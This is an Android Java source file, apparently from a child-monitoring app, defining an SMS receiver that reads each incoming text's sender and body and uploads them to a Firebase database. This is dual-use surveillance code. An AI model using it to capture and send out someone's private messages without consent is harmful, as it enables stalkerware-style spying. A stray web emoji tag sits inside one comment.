package com.example.rafiw.securechild;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import static android.content.ContentValues.TAG;


public class SmsBroadcastReceiver extends BroadcastReceiver {

    private String TAG = SmsBroadcastReceiver.class.getSimpleName();

    public SmsBroadcastReceiver() {
    }

    public static final String SMS_BUNDLE = "pdus";
    DatabaseReference mDatabaseLocationDetails;

    public void onReceive(Context context, Intent intent) {


        mDatabaseLocationDetails = FirebaseDatabase.getInstance().getReference().child("sms_Details").push();

        //  Bundle intentExtras = intent.getExtras();
        Bundle bundle = intent.getExtras();



            /*if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsMessageStr = "";
            for (int i = 0; i < sms.length; ++i) {
                String format = intentExtras.getString("format");
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i], format);

                String smsBody = smsMessage.getMessageBody().toString();
                String address = smsMessage.getOriginatingAddress();

                smsMessageStr += "SMS From: " + address + "\n";
                smsMessageStr += smsBody + "\n";
            }

                mDatabaseLocationDetails.child("sms").setValue(smsMessageStr);


                MainActivity inst = MainActivity.instance();
            inst.updateInbox(smsMessageStr);
        }*/

        SmsMessage[] msgs = null;

        String str = "";

        if (bundle != null) {
            // Retrieve the SMS Messages received
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];

            // For every SMS message received
            for (int i = 0; i < msgs.length; i++) {
                // Convert Object array
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                // Sender's phone number
                str += "SMS from " + msgs[i].getOriginatingAddress() + " : ";
                // Fetch the text message
                str += msgs[i].getMessageBody().toString();
                // Newline <img draggable="false" class="emoji" alt="🙂" src="https://s.w.org/images/core/emoji/72x72/1f642.png">
                str += "\n";
            }

            // Display the entire SMS Message
            mDatabaseLocationDetails.child("sms").setValue(str);
            Log.d(TAG, str);

        }
    }
}
